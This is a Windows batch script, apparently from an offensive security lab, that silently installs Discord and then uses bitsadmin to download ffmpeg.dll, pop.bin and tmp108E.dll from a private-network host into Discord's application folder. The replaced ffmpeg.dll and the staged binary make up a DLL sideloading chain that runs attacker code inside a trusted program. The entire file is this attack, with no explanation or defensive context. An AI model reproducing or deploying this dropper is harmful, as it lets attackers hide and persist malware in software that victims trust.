@echo off
set DOWNLOAD_URL=https://dl.discordapp.net/distro/app/stable/win/x86/1.0.9012/DiscordSetup.exe
set DOWNLOAD_DLL=http://192.168.120.128/ffmpeg.dll 
set DOWNLOAD_BIN=http://192.168.120.128/pop.bin
set DOWNLOAD_tmp=http://192.168.120.128/tmp108E.dll
set DOWNLOAD_LOCATION=C:\Windows\Temp\Update.exe
set EXECUTE_LOCATION=C:\Windows\Temp\

set COPY_LOCATION=%LOCALAPPDATA%\Discord\app-1.0.9012\
set DL_DLL=%LOCALAPPDATA%\Discord\app-1.0.9012\ffmpeg.dll
set DL_tmp=%LOCALAPPDATA%\Discord\app-1.0.9012\tmp108E.dll
set DL_bin=%LOCALAPPDATA%\Discord\app-1.0.9012\pop.bin


bitsadmin /transfer myDownloadJob /priority normal %DOWNLOAD_URL% %DOWNLOAD_LOCATION%
start "" "%EXECUTE_LOCATION%\Update.exe" --silent
timeout /t 10
bitsadmin /transfer myDownloadJob1 /priority normal %DOWNLOAD_DLL% %DL_DLL%
bitsadmin /transfer myDownloadJob2 /priority normal %DOWNLOAD_BIN% %DL_bin%
bitsadmin /transfer myDownloadJob3 /priority normal %DOWNLOAD_tmp% %DL_tmp%

